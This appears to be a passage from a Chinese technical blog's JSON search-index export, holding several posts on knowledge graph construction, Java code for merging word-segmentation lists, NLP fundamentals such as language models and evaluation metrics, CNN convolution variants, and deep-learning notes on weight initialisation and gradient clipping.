Level)。事实上，模式是对知识的提炼，而且遵循预先给定的schema有助于知识的标准化，更利于查询等后续处理。为知识图谱构建schema相当于为其建立本体(Ontology)。最基本的本体包括概念、概念层次、属性、属性值类型、关系、关系定义域(Domain)概念集以及关系值域(Range)概念集。在此基础上，我们可以额外添加规则(Rules)或公理(Axioms)来表示模式层更复杂的约束关系。面对如此庞大且领域无关的知识库，即使是构建最基本的本体，也是非常有挑战的。Google等公司普遍采用的方法是自顶向下(Top-Down)和自底向上(Bottom-Up)相结合的方式。这里，自顶向下的方式是指通过本体编辑器(Ontology Editor)预先构建本体。当然这里的本体构建不是从无到有的过程，而是依赖于从百科类和结构化数据得到的高质量知识中所提取的模式信息。更值得一提的是，Google知识图谱的Schema是在其收购的Freebase的schema基础上修改而得。Freebase的模式定义了Domain(领域)，Type(类别)和Topic(主题，即实体)。每个Domain有若干Types，每个Type包含多个Topics且和多个Properties关联，这些Properties规定了属于当前Type的那些Topics需要包含的属性和关系。定义好的模式可被用于抽取属于某个Type或满足某个Property的新实体(或实体对)。另一方面，自底向上的方式则通过上面介绍的各种抽取技术，特别是通过搜索日志和Web Table抽取发现的类别、属性和关系，并将这些置信度高的模式合并到知识图谱中。合并过程将使用类似实体对齐的对齐算法。对于未能匹配原有知识图谱中模式的类别、属性和关系作为新的模式加入知识图谱供人工过滤。自顶向下的方法有利于抽取新的实例，保证抽取质量，而自底向上的方法则能发现新的模式。两者是互补的。 不一致性的解决 当融合来自不同数据源的信息构成知识图谱时，有一些实体会同时属于两个互斥的类别(如男女)或某个实体所对应的一个Property11对应多个值。这样就会出现不一致性。这些互斥的类别对以及Functional Properties可以看作是模式层的知识，通常规模不是很大，可以通过手工指定规则来定义。而由于不一致性的检测要面对大规模的实体及相关事实，纯手工的方法将不再可行。一个简单有效的方法充分考虑数据源的可靠性以及不同信息在各个数据源中出现的频度等因素来决定最终选用哪个类别或哪个属性值。也就是说，我们优先采用那些可靠性高的数据源(如百科类或结构化数据)抽取得到的事实。另外，如果一个实体在多个数据源中都被识别为某个类别的实例，或实体某个functional property在多个数据源中都对应相同的值，那么我们倾向于最终选择该类别和该值。注：在统计某个类别在数据源中出现的频率前需要完成类别对齐计算。类似地，对于数值型的属性值我们还需要额外统一它们所使用的单位。 知识图谱上的挖掘 通过各种信息抽取和数据集成技术已经可以构建Web规模的知识图谱。为了进一步增加图谱的知识覆盖率，需要进一步在知识图谱上进行挖掘。下面将介绍几项重要的基于知识图谱的挖掘技术。 推理 推理(Reasoning或Inference)被广泛用于发现隐含知识。推理功能一般通过可扩展的规则引擎来完成。知识图谱上的规则一般涉及两大类。一类是针对属性的，即通过数值计算来获取其属性值。例如：知识图谱中包含某人的出生年月，我们可以通过当前日期减去其出生年月获取其年龄。这类规则对于那些属性值随时间或其他因素发生改变的情况特别有用。另一类是针对关系的，即通过(链式)规则发现实体间的隐含关系。例如，我们可以定义规定：岳父是妻子的父亲。利用这条规则，当已知姚明的妻子(叶莉)和叶莉的父亲(叶发)时，可以推出姚明的岳父是叶发。 实体重要性排序 搜索引擎识别用户查询中提到的实体，并通过知识卡片展现该实体的结构化摘要。当查询涉及多个实体时，搜索引擎将选择与查询更相关且更重要的实体来展示。实体的相关性度量需在查询时在线计算，而实体重要性与查询无关可离线计算。搜索引擎公司将PageRank算法[12] 应用在知识图谱上来计算实体的重要性。和传统的Web Graph相比，知识图谱中的节点从单一的网页变成了各种类型的实体，而图中的边也由连接网页的超链接(Hyperlink)变成丰富的各种语义关系。由于不同的实体和语义关系的流行程度以及抽取的置信度均不同，而这些因素将影响实体重要性的最终计算结果，因此，各大搜索引擎公司嵌入这些因素来刻画实体和语义关系的初始重要性，从而使用带偏的PageRank算法(Biased PageRank)。 相关实体挖掘 在相同查询中共现的实体，或在同一个查询会话(Session)中被提到的其他实体称为相关实体。一个常用的做法是将这些查询或会话看作是虚拟文档，将其中出现的实体看作是文档中的词条，使用主题模型(如LDA)发现虚拟文档集中的主题分布。其中每个主题包含1个或多个实体，这些在同一个主题中的实体互为相关实体。当用户输入查询时，搜索引擎分析查询的主题分布并选出最相关的主题。同时，搜索引擎将给出该主题中与知识卡片所展现的实体最相关的那些实体作为“其他人还搜了”的推荐结果。 知识图谱的更新和维护 Type和Collection的关系 知识图谱的schema为了保证其质量，由专业团队审核和维护。以Google知识图谱为例，目前定义的Type数在103-104的数量级。为了提高知识图谱的覆盖率，搜索引擎公司还通过自动化算法从各种数据源抽取新的类型信息(也包含关联的Property信息)，这些类型信息通过一个称为Collection的数据结构保存。它们不是马上被加入到知识图谱schema中。有些今天生成后第二天就被删除了，有些则能长期的保留在Collection中，如果Collection中的某一种类型能够长期的保留，发展到一定程度后，由专业的人员进行决策和命名并最终成为一种新的Type。 结构化站点包装器的维护 站点的更新常常会导致原有模式失效。搜索引擎会定期检查站点是否存在更新。当检测到现有页面(原先已爬取)发生了变化，搜索引擎会检查这些页面的变化量，同时使用最新的站点包装器进行AVP抽取。如果变化量超过事先设定的阈值且抽取结果与原先标注的答案差别较大，则表明现有的站点包装器失效了。在这种情况下，需要对最新的页面进行重新标注并学习新的模式，从而构建更新的包装器。 知识图谱的更新频率 加入到知识图谱中的数据不是一成不变的。Type对应的实例往往是动态变化的。例如，美国总统，随着时间的推移，可能对应不同的人。由于数据层的规模和更新频度都远超schema层，搜索引擎公司利用其强大的计算保证图谱每天的更新都能在3个小时内完成，而实时的热点也能保证在事件发生6个小时内在搜索结果中反映出来。 众包(Crowdsourcing)反馈机制 除了搜索引擎公司内部的专业团队对构建的知识图谱进行审核和维护，它们还依赖用户来帮助改善图谱。具体来说，用户可以对搜索结果中展现的知识卡片所列出的实体相关的事实进行纠错。当很多用户都指出某个错误时，搜索引擎将采纳并修正。这种利用群体智慧的协同式知识编辑是对专业团队集中式管理的互补。 知识图谱在搜索中的应用 查询理解 搜索引擎借助知识图谱来识别查询中涉及到的实体(概念)及其属性等，并根据实体的重要性展现相应的知识卡片。搜索引擎并非展现实体的全部属性，而是根据当前输入的查询自动选择最相关的属性及属性值来显示。此外，搜索引擎仅当知识卡片所涉及的知识的正确性很高(通常超过95%，甚至达到99%)时，才会展现。当要展现的实体被选中之后，利用相关实体挖掘来推荐其他用户可能感兴趣的实体供进一步浏览。 问题回答 除了展现与查询相关的知识卡片，知识图谱对于搜索所带来的另一个革新是：直接返回答案，而不仅仅是排序的文档列表。要实现自动问答系统，搜索引擎不仅要理解查询中涉及到的实体及其属性，更需要理解查询所对应的语义信息。搜索引擎通过高效的图搜索，在知识图谱中查找连接这些实体及属性的子图并转换为相应的图查询(如SPARQL[13] )。这些翻译过的图查询被进一步提交给图数据库进行回答返回相应的答案。 总结 这篇文章比较系统地介绍了知识图谱的表示、构建、挖掘以及在搜索中的应用。通过上述介绍，大家可以看出： 目前知识图谱还处于初期阶段; 人工干预很重要; 结构化数据在知识图谱的构建中起到决定性作用; 各大搜索引擎公司为了保证知识图谱的质量多半采用成熟的算法; 知识卡片的给出相对比较谨慎; 更复杂的自然语言查询将崭露头角(如Google的蜂鸟算法)。 此外，知识图谱的构建是多学科的结合，需要知识库、自然语言理解，机器学习和数据挖掘等多方面知识的融合。有很多开放性问题需要学术界和业界一起解决。我们有理由相信学术界在上述方面的突破将会极大地促进知识图谱的发展。 本文链接： http://www.meng.uno/articles/349dc05d/ 欢迎转载！","categories":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/categories/AI/"},{"name":"NLP","slug":"AI/NLP","permalink":"http://www.meng.uno/categories/AI/NLP/"}],"tags":[{"name":"知识图谱","slug":"知识图谱","permalink":"http://www.meng.uno/tags/知识图谱/"},{"name":"Knowledge Graph","slug":"Knowledge-Graph","permalink":"http://www.meng.uno/tags/Knowledge-Graph/"}]},{"title":"Java合并List","slug":"combine-list","date":"2018-07-15T02:15:54.000Z","updated":"2018-08-15T14:35:34.738Z","comments":true,"path":"articles/66999e7d/","link":"","permalink":"http://www.meng.uno/articles/66999e7d/","excerpt":"问题 在写我的毕业设计时，遇到了这样两个问题： 1. 给定一个分词结果（List ）与一个知道偏置的专有名词（特定领域命名实体）的结果（List ），怎么将两者融合成一个统一的分词结果（List ）。 2. 给定一个分词结果（List ）与一条规则（人为规定的分词结果（List ）），怎么将规则整合到分词结果中，得到一个统一的分词结果（List ）。 虽然在算法上没有多少难度，但是在实现上还是挺费时间思考，所以我将我的实现保存起来，以后没准我还会再用到。 方案 合并专有名词 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 2","text":"问题 在写我的毕业设计时，遇到了这样两个问题： 给定一个分词结果（List ）与一个知道偏置的专有名词（特定领域命名实体）的结果（List ），怎么将两者融合成一个统一的分词结果（List ）。 给定一个分词结果（List ）与一条规则（人为规定的分词结果（List ）），怎么将规则整合到分词结果中，得到一个统一的分词结果（List ）。 虽然在算法上没有多少难度，但是在实现上还是挺费时间思考，所以我将我的实现保存起来，以后没准我还会再用到。 方案 合并专有名词 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 public List&lt;String&gt; segTemp(List&lt;String&gt; tmp, List&lt;Term&gt; area, int len) &#123; List&lt;String&gt; ret = new ArrayList&lt;String&gt;(); int area_len = area.size(); if (area_len == 0) &#123; return tmp; &#125; int index = 0; int tmp_index = 0; int tmp_i = 0; int i = 0; for (i = 0; i &lt; tmp.size(); i++) &#123; if (index == area.get(tmp_i).getOffe()) &#123; ret.add(area.get(tmp_i).getRealName()); index += area.get(tmp_i).getRealName().length(); i--; if (tmp_i &lt; area_len - 1) &#123; tmp_i++; continue; &#125; else &#123; break; &#125; &#125; else if (index &gt; tmp_index) &#123; if (tmp_index + tmp.get(i).length() &lt;= index)&#123; tmp_index += tmp.get(i).length(); &#125; else &#123; ret.add(tmp.get(i).substring(index - tmp_index)); tmp_index += tmp.get(i).length(); index = tmp_index; &#125; &#125; else if (index + tmp.get(i).length() &lt;= area.get(tmp_i).getOffe()) &#123; ret.add(tmp.get(i)); index += tmp.get(i).length(); tmp_index += tmp.get(i).length(); &#125; else if (index + tmp.get(i).length() &gt; area.get(tmp_i).getOffe() &amp;&amp; index &lt; area.get(tmp_i).getOffe()) &#123; ret.add(tmp.get(i).substring(0, area.get(tmp_i).getOffe() - index)); index += area.get(tmp_i).getOffe() - index; tmp_index += tmp.get(i).length(); &#125; &#125; // 从上一个位置break for (int j = i + 1; j &lt; tmp.size(); j++) &#123; if (index &gt; tmp_index) &#123; if (tmp_index + tmp.get(j).length() &lt;= index) &#123; tmp_index += tmp.get(j).length(); &#125; else &#123; ret.add(tmp.get(j).substring(index - tmp_index)); tmp_index += tmp.get(j).length(); index = tmp_index; &#125; &#125; else &#123; ret.add(tmp.get(j)); &#125; &#125; return ret;&#125; 合并规则 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 public static List&lt;String&gt; match(String text, List&lt;String&gt; ori, List&lt;Rule&gt; rule)&#123; if(rule.isEmpty())&#123; return ori; &#125; List&lt;String&gt; ret = new ArrayList&lt;String&gt;(); boolean flag = false; for(Rule ru : rule)&#123; List&lt;Integer&gt; loc = getLocation(text,ru.toString()); if(loc.isEmpty())&#123; continue; &#125;else&#123; flag = true; int num = loc.size(); int j = 0; int idx = 0; for(int i = 0; i&lt; num;i++)&#123; int tmp = loc.get(i); while(idx+ori.get(j).length() &lt; tmp)&#123; ret.add(ori.get(j)); idx += ori.get(j).length(); j++; &#125; if(ori.get(j).substring(idx+ori.get(j).length() - tmp) != null || !ori.get(j).substring(idx+ori.get(j).length() - tmp).equals(\"\"))&#123; ret.add(ori.get(j).substring(idx+ori.get(j).length() - tmp)); j++; &#125; ret.addAll(ru.getRule()); while(j&lt;ori.size())&#123; if(idx + ori.get(j).length() &lt;= tmp+ru.toString().length())&#123; idx += ori.get(j).length(); j++; &#125;else if(idx + ori.get(j).length() &gt; tmp+ru.toString().length() &amp;&amp; idx &lt; tmp + ru.toString().length())&#123; idx += ori.get(j).length(); ret.add(ori.get(j).substring(idx - (tmp + ru.toString().length() ))); j++; &#125;else&#123; break; &#125; &#125; &#125; if(j&lt;ori.size())&#123; for(int t = j;t &lt; ori.size();t++)&#123; ret.add(ori.get(t)); &#125; &#125; ori = ret; &#125; &#125; if(flag == false)&#123; return ori; &#125; return ret; &#125; 本文链接： http://www.meng.uno/articles/66999e7d/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"}]},{"title":"自然语言处理（NLP）基础","slug":"NLP-自然语言处理基础","date":"2018-07-05T14:09:21.000Z","updated":"2018-08-16T03:55:08.368Z","comments":true,"path":"articles/d1bd92c6/","link":"","permalink":"http://www.meng.uno/articles/d1bd92c6/","excerpt":"NLP 概述 解决 NLP 问题的一般思路 1 2 3 这个问题人类可以做好么？ - 可以 -> 记录自己的思路 -> 设计流程让机器完成你的思路 - 很难 -> 尝试从计算机的角度来思考问题 NLP 的历史进程 * 规则系统 * 正则表达式/自动机 * 规则是固定的 * 搜索引擎 1 2 3 4 5 “豆瓣酱用英语怎么说？” 规则：“xx用英语怎么说？” => translate(XX, English) “我饿了”","text":"NLP 概述 解决 NLP 问题的一般思路 123 这个问题人类可以做好么？ - 可以 -&gt; 记录自己的思路 -&gt; 设计流程让机器完成你的思路 - 很难 -&gt; 尝试从计算机的角度来思考问题 NLP 的历史进程 规则系统 正则表达式/自动机 规则是固定的 搜索引擎 12345 “豆瓣酱用英语怎么说？”规则：“xx用英语怎么说？” =&gt; translate(XX, English)“我饿了”规则：“我饿（死）了” =&gt; recommend(饭店，地点) 概率系统 规则从数据中抽取 规则是有概率的 概率系统的一般工作方式 1234567 流程设计 收集训练数据 预处理 特征工程 分类器（机器学习算法） 预测 评价 最重要的部分：数据收集、预处理、特征工程 示例 123456789101112131415161718192021222324252627 任务： “豆瓣酱用英语怎么说” =&gt; translate(豆瓣酱，Eng)流程设计（序列标注）： 子任务1： 找出目标语言 “豆瓣酱用 **英语** 怎么说” 子任务2： 找出翻译目标 “ **豆瓣酱** 用英语怎么说”收集训练数据： （子任务1） “豆瓣酱用英语怎么说” “茄子用英语怎么说” “黄瓜怎么翻译成英语”预处理： 分词：“豆瓣酱 用 英语 怎么说”抽取特征： （前后各一个词） 0 茄子： &lt; _ 用 0 用： 豆瓣酱 _ 英语 1 英语： 用 _ 怎么说 0 怎么说： 英语 _ &gt;分类器： SVM/CRF/HMM/RNN预测： 0.1 茄子： &lt; _ 用 0.1 用： 豆瓣酱 _ 英语 0.7 英语： 用 _ 怎么说 0.1 怎么说： 英语 _ &gt;评价： 准确率 概率系统的优/缺点 + 规则更加贴近于真实事件中的规则，因而效果往往比较好 - 特征是由专家/人指定的； - 流程是由专家/人设计的； - 存在独立的子任务 深度学习 深度学习相对概率模型的优势 特征是由专家指定的 -&gt; 特征是由深度学习自己提取的 流程是由专家设计的 -&gt; 模型结构是由专家设计的 存在独立的子任务 -&gt; End-to-End Training Seq2Seq 模型 大部分自然语言问题都可以使用 Seq2Seq 模型解决 “万物”皆 Seq2Seq 评价机制 困惑度 (Perplexity, PPX) Perplexity - Wikipedia 在信息论中，perplexity 用于度量一个概率分布或概率模型预测样本的好坏程度 基本公式 概率分布（离散）的困惑度 其中 H(p) 即信息熵 概率模型的困惑度 通常 b=2 指数部分也可以是交叉熵的形式，此时困惑度相当于交叉熵的指数形式 其中 p~ 为测试集中的经验分布——p~(x) = n/N，其中 n 为 x 的出现次数，N 为测试集的大小 语言模型中的 PPX 在 NLP 中，困惑度常作为语言模型的评价指标 直观来说，就是下一个候选词数目的期望值—— 如果不使用任何模型，那么下一个候选词的数量就是整个词表的数量；通过使用 bi-gram语言模型，可以将整个数量限制到 200 左右 BLEU 一种机器翻译的评价准则——BLEU - CSDN博客 机器翻译评价准则 计算公式 其中 c 为生成句子的长度；r 为参考句子的长度——目的是惩罚长度过短的候选句子 为了计算方便，会加一层 log 通常 N=4, w_n=1/4 ROUGE 自动文摘评测方法：Rouge-1、Rouge-2、Rouge-L、Rouge-S - CSDN博客 一种机器翻译/自动摘要的评价准则 BLEU，ROUGE，METEOR，ROUGE-浅述自然语言处理机器翻译常用评价度量 - CSDN博客 语言模型 XX 模型的含义 如果能使用某个方法对 XX 打分（Score），那么就可以把这个方法称为 “XX 模型” 篮球明星模型: Score(库里)、Score(詹姆斯) 话题模型——对一段话是否在谈论某一话题的打分 12 Score( NLP | &quot;什么 是 语言 模型？&quot; ) --&gt; 0.8Score( ACM | &quot;什么 是 语言 模型？&quot; ) --&gt; 0.05 概率/统计语言模型 (PLM, SLM) 语言模型是一种对语言打分的方法；而概率语言模型把语言的“得分”通过概率来体现 具体来说，概率语言模型计算的是一个序列作为一句话可能的概率 12 Score(&quot;什么 是 语言 模型&quot;) --&gt; 0.05 # 比较常见的说法，得分比较高Score(&quot;什么 有 语言 模型&quot;) --&gt; 0.01 # 不太常见的说法，得分比较低 以上过程可以形式化为： 根据贝叶斯公式，有 其中每个条件概率就是模型的参数；如果这个参数都是已知的，那么就能得到整个序列的概率了 参数的规模 设词表的大小为 N，考虑长度为 T 的句子，理论上有 N^T 种可能的句子，每个句子中有 T 个参数，那么参数的数量将达到 O(T*N^T) 可用的概率模型 统计语言模型实际上是一个概率模型，所以常见的概率模型都可以用于求解这些参数 常见的概率模型有：N-gram 模型、决策树、最大熵模型、隐马尔可夫模型、条件随机场、神经网络等 目前常用于语言模型的是 N-gram 模型和神经语言模型（下面介绍） N-gram 语言模型 马尔可夫(Markov)假设——未来的事件，只取决于有限的历史 基于马尔可夫假设，N-gram 语言模型认为一个词出现的概率只与它前面的 n-1 个词相关 根据条件概率公式与大数定律，当语料的规模足够大时，有 以 n=2 即 bi-gram 为例，有 假设词表的规模 N=200000（汉语的词汇量），模型参数与 `n· 的关系表 可靠性与可区别性 假设没有计算和存储限制，n 是不是越大越好？ 早期因为计算性能的限制，一般最大取到 n=4；如今，即使 n&gt;10 也没有问题， 但是，随着 n 的增大，模型的性能增大却不显著，这里涉及了可靠性与可区别性的问题 参数越多，模型的可区别性越好，但是可靠性却在下降——因为语料的规模是有限的，导致 count(W) 的实例数量不够，从而降低了可靠性 OOV 问题 OOV 即 Out Of Vocabulary，也就是序列中出现了词表外词，或称为未登录词 或者说在测试集和验证集上出现了训练集中没有过的词 一般解决方案： 设置一个词频阈值，只有高于该阈值的词才会加入词表 所有低于阈值的词替换为 UNK（一个特殊符号） 无论是统计语言模型还是神经语言模型都是类似的处理方式 NPLM 中的 OOV 问题 平滑处理 TODO count(W) = 0 是怎么办？ 平滑方法（层层递进）： Add-one Smoothing (Laplace) Add-k Smoothing (k&lt;1) Back-off （回退） Interpolation （插值法） Absolute Discounting （绝对折扣法） Kneser-Ney Smoothing （KN） Modified Kneser-Ney 自然语言处理中N-Gram模型的Smoothing算法 - CSDN博客 神经概率语言模型 (NPLM) 神经概率语言模型依然是一个概率语言模型，它通过神经网络来计算概率语言模型中每个参数 其中 g 表示神经网络，i_w 为 w 在词表中的序号，context(w) 为 w 的上下文，V_context 为上下文构成的特征向量。 V_context 由上下文的词向量进一步组合而成 N-gram 神经语言模型 这是一个经典的神经概率语言模型，它沿用了 N-gram 模型中的思路，将 w 的前 n-1 个词作为 w 的上下文 context(w)，而 V_context 由这 n-1 个词的词向量拼接而成，即 其中 c(w) 表示 w 的词向量 不同的神经语言模型中 context(w) 可能不同，比如 Word2Vec 中的 CBOW 模型 每个训练样本是形如 (context(w), w) 的二元对，其中 context(w) 取 w 的前 n-1 个词；当不足 n-1，用特殊符号填充 同一个网络只能训练特定的 n，不同的 n 需要训练不同的神经网络 N-gram 神经语言模型的网络结构 【输入层】首先，将 context(w) 中的每个词映射为一个长为 m 的词向量，词向量在训练开始时是随机的，并参与训练； 【投影层】将所有上下文词向量拼接为一个长向量，作为 w 的特征向量，该向量的维度为 m(n-1) 【隐藏层】拼接后的向量会经过一个规模为 h 隐藏层，该隐层使用的激活函数为 tanh 【输出层】最后会经过一个规模为 N 的 Softmax 输出层，从而得到词表中每个词作为下一个词的概率分布 其中 m, n, h 为超参数，N 为词表大小，视训练集规模而定，也可以人为设置阈值 训练时，使用交叉熵作为损失函数 当训练完成时，就得到了 N-gram 神经语言模型，以及副产品词向量 整个模型可以概括为如下公式： 原文的模型还考虑了投影层与输出层有有边相连的情形，因而会多一个权重矩阵，但本质上是一致的： 模型参数的规模与运算量 模型的超参数：m, n, h, N m 为词向量的维度，通常在 10^1 ~ 10^2 n 为 n-gram 的规模，一般小于 5 h 为隐藏的单元数，一般在 10^2 N 位词表的数量，一般在 10^4 ~ 10^5，甚至 10^6 网络参数包括两部分 词向量 C: 一个 N * m 的矩阵——其中 N 为词表大小，m 为词向量的维度 网络参数 W, U, p, q： 1234 - W: h * m(n-1) 的矩阵- p: h * 1 的矩阵- U: N * h 的矩阵- q: N * 1 的矩阵 模型的运算量 主要集中在隐藏层和输出层的矩阵运算以及 SoftMax 的归一化计算 此后的相关研究中，主要是针对这一部分进行优化，其中就包括 Word2Vec 的工作 相比 N-gram 模型，NPLM 的优势 单词之间的相似性可以通过词向量来体现 相比神经语言模型本身，作为其副产品的词向量反而是更大的惊喜 自带平滑处理 NPLM 中的 OOV 问题 在处理语料阶段，与 N-gram 中的处理方式是一样的——将不满阈值的词全部替换为 UNK 神经网络中，一般有如下几种处理 UNK 的思路 为 UNK 分配一个随机初始化的 embedding，并参与训练 最终得到的 embedding 会有一定的语义信息，但具体好坏未知 把 UNK 都初始化成 0 向量，不参与训练 UNK 共享相同的语义信息 每次都把 UNK 初始化成一个新的随机向量，不参与训练 常用的方法——因为本身每个 UNK 都不同，随机更符合对 UNK 基于最大熵的估计 How to add new embeddings for unknown words in Tensorflow (training &amp; pre-set for testing) - Stack Overflow Initializing Out of Vocabulary (OOV) tokens - Stack Overflow 基于 Char-Level 的方法 PaperWeekly 第七期 – 基于Char-level的NMT OOV解决方案 本文链接： http://www.meng.uno/articles/d1bd92c6/ 欢迎转载！","categories":[{"name":"NLP","slug":"NLP","permalink":"http://www.meng.uno/categories/NLP/"}],"tags":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/tags/AI/"},{"name":"NLP","slug":"NLP","permalink":"http://www.meng.uno/tags/NLP/"},{"name":"自然语言处理","slug":"自然语言处理","permalink":"http://www.meng.uno/tags/自然语言处理/"}]},{"title":"CNN","slug":"DL-CNN","date":"2018-07-04T04:09:21.000Z","updated":"2018-08-16T04:23:00.528Z","comments":true,"path":"articles/7203e497/","link":"","permalink":"http://www.meng.uno/articles/7203e497/","excerpt":"为什么使用 CNN 代替 RNN 关于序列建模，是时候抛弃RNN和LSTM了 | 机器之心 [英文原文] RNN/LSTM 本身的问题(3) 1. RNN 需要更多的资源来训练，它和 硬件加速不匹配 训练 RNN 和 LSTM 非常困难，因为计算能力受到内存和带宽等的约束。简单来说，每个 LSTM 单元需要四个仿射变换，且每一个时间步都需要运行一次，这样的仿射变换会要求非常多的内存带宽。添加更多的计算单元很容易，但添加更多的内存带宽却很难——这与目前的硬件加速技术不匹配，一个可能的解决方案就是让计算在存储器设备中完成。 2. RNN 容易发生梯度消失，即使是 LST","text":"为什么使用 CNN 代替 RNN 关于序列建模，是时候抛弃RNN和LSTM了 | 机器之心 [英文原文] RNN/LSTM 本身的问题(3) RNN 需要更多的资源来训练，它和 硬件加速不匹配 训练 RNN 和 LSTM 非常困难，因为计算能力受到内存和带宽等的约束。简单来说，每个 LSTM 单元需要四个仿射变换，且每一个时间步都需要运行一次，这样的仿射变换会要求非常多的内存带宽。添加更多的计算单元很容易，但添加更多的内存带宽却很难——这与目前的硬件加速技术不匹配，一个可能的解决方案就是让计算在存储器设备中完成。 RNN 容易发生梯度消失，即使是 LSTM 在长期信息访问当前处理单元之前，需要按顺序地通过所有之前的单元。这意味着它很容易遭遇梯度消失问题；LSTM 一定程度上解决了这个问题，但 LSTM 网络中依然存在顺序访问的序列路径——直观来说，LSTM 能跳过一段信息中不太重要的部分，但如果整段信息都很重要，它依然需要完整的顺序访问，此时就跟 RNN 没有区别了。 注意力机制模块（记忆模块）的应用 注意力机制模块可以同时前向预测和后向回顾。 分层注意力编码器（Hierarchical attention encoder） - 分层注意力模块通过一个**层次结构**将过去编码向量**汇总**到一个**上下文向量**`C_t` ——这是一种更好的**观察过去信息**的方式（观点） - **分层结构**可以看做是一棵**树**，其路径长度为 `logN`，而 RNN/LSTM 则相当于一个**链表**，其路径长度为 `N`，如果序列足够长，那么可能 `N >> logN` > [放弃 RNN/LSTM 吧，因为真的不好用！望周知~](https://blog.csdn.net/heyc861221/article/details/80174475) - CSDN博客 任务角度 从任务本身考虑，我认为也是 CNN 更有利，LSTM 因为能记忆比较长的信息，所以在推断方面有不错的表现（直觉）；但是在事实类问答中，并不需要复杂的推断，答案往往藏在一个 n-gram 短语中，而 CNN 能很好的对 n-gram 建模。 常见的卷积结构 一文了解各种卷积结构原理及优劣 - 知乎 &amp; vdumoulin/ conv_arithmetic - GitHUub 基本卷积 No padding, no strides Arbitrary padding, no strides Half padding, no strides Full padding, no strides No padding, strides Padding, strides Padding, strides (odd) 转置卷积 转置卷积（Transposed Convolution），又称反卷积（Deconvolution）、Fractionally Strided Convolution 反卷积的说法不够准确，数学上有定义真正的反卷积，两者的操作是不同的 转置卷积是卷积的逆过程，如果把基本的卷积（+池化）看做“缩小分辨率”的过程，那么转置卷积就是“扩充分辨率”的过程。 为了实现扩充的目的，需要对输入以某种方式进行填充。 转置卷积与数学上定义的反卷积不同——在数值上，它不能实现卷积操作的逆过程。其内部实际上执行的是常规的卷积操作。 转置卷积只是为了重建先前的空间分辨率，执行了卷积操作。 虽然转置卷积并不能还原数值，但是用于编码器-解码器结构中，效果仍然很好。——这样，转置卷积可以同时实现图像的粗粒化和卷积操作，而不是通过两个单独过程来完成。 No padding, no strides, transposed Arbitrary padding, no strides, transposed Half padding, no strides, transposed Full padding, no strides, transposed No padding, strides, transposed Padding, strides, transposed Padding, strides, transposed (odd) 空洞卷积 空洞卷积（Atrous Convolutions）也称扩张卷积（Dilated Convolutions）、膨胀卷积。 No padding, no strides. 空洞卷积的作用 空洞卷积使 CNN 能够捕捉更远的信息，获得更大的感受野；同时不增加参数的数量，也不影响训练的速度。 示例：Conv1D + 空洞卷积 可分离卷积 可分离卷积（separable convolution） TODO Keras 实现 Keras 中通过在卷积层中加入参数 dilation_rate实现 123 Conv1D(filters=config.filters, kernel_size=config.kernel_size, dilation_rate=2) TODO: 维度变化 门卷积 卷积新用之语言模型 - CSDN博客 类似 LSTM 的过滤机制，实际上是卷积网络与门限单元（Gated Linear Unit）的组合 核心公式 中间的运算符表示逐位相乘—— Tensorflow 中由 tf.multiply(a, b) 实现，其中 a 和 b 的 shape 要相同；后一个卷积使用sigmoid激活函数 一个门卷积 Block W 和 V 表明参数不共享 实践中，为了防止梯度消失，还会在每个 Block 中加入残差 门卷积的作用 减缓梯度消失 解决语言顺序依存问题（？ TODO） 门卷积是如何防止梯度消失的 因为公式中有一个卷积没有经过激活函数，所以对这部分求导是个常数，所以梯度消失的概率很小。 如果还是担心梯度消失，还可以加入残差——要求输入输出的 shape 一致 更直观的理解： 即信息以 1-σ 的概率直接通过，以 σ 的概率经过变换后通过——类似 GRU 因为Conv1D(X)没有经过激活函数，所以实际上它只是一个线性变化；因此与 Conv1D(X) - X 是等价的 基于CNN的阅读理解式问答模型：DGCNN - 科学空间|Scientific Spaces 本文链接： http://www.meng.uno/articles/7203e497/ 欢迎转载！","categories":[{"name":"DeepLearning","slug":"DeepLearning","permalink":"http://www.meng.uno/categories/DeepLearning/"}],"tags":[{"name":"CNN","slug":"CNN","permalink":"http://www.meng.uno/tags/CNN/"},{"name":"深度学习","slug":"深度学习","permalink":"http://www.meng.uno/tags/深度学习/"},{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/tags/AI/"}]},{"title":"《深度学习》问题解答","slug":"DL-《深度学习》整理","date":"2018-05-03T18:09:21.000Z","updated":"2018-08-16T04:28:44.135Z","comments":true,"path":"articles/f42d8431/","link":"","permalink":"http://www.meng.uno/articles/f42d8431/","excerpt":"如何设置网络的初始值？* 《深度学习》 8.4 参数初始化策略 一般总是使用服从（截断）高斯或均匀分布的随机值，具体是高斯还是均匀分布影响不大，但是也没有详细的研究。 但是，初始值的大小会对优化结果和网络的泛化能力产生较大的影响。 一些启发式初始化策略通常是根据输入与输出的单元数来决定初始权重的大小，比如 Glorot and Bengio (2010) 中建议建议使用的标准初始化，其中 m 为输入数，n 为输出数 还有一些方法推荐使用随机正交矩阵来初始化权重 (Saxe et al., 2013)。 常用的初始化策略可以参考 Keras 中文文档：初始化方法Initialize","text":"如何设置网络的初始值？* 《深度学习》 8.4 参数初始化策略 一般总是使用服从（截断）高斯或均匀分布的随机值，具体是高斯还是均匀分布影响不大，但是也没有详细的研究。 但是，初始值的大小会对优化结果和网络的泛化能力产生较大的影响。 一些启发式初始化策略通常是根据输入与输出的单元数来决定初始权重的大小，比如 Glorot and Bengio (2010) 中建议建议使用的标准初始化，其中 m 为输入数，n 为输出数 还有一些方法推荐使用随机正交矩阵来初始化权重 (Saxe et al., 2013)。 常用的初始化策略可以参考 Keras 中文文档：初始化方法Initializers 梯度爆炸的解决办法*** 27. 如何避免深度学习中的病态，鞍点，梯度爆炸，梯度弥散？*** 梯度爆炸： 梯度截断（gradient clipping）——如果梯度超过某个阈值，就对其进行限制 《深度学习》 10.11.1 截断梯度 下面是 Tensorflow 提供的几种方法： tf.clip_by_value(t, clip_value_min, clip_value_max) tf.clip_by_norm(t, clip_norm) tf.clip_by_average_norm(t, clip_norm) tf.clip_by_global_norm(t_list, clip_norm) 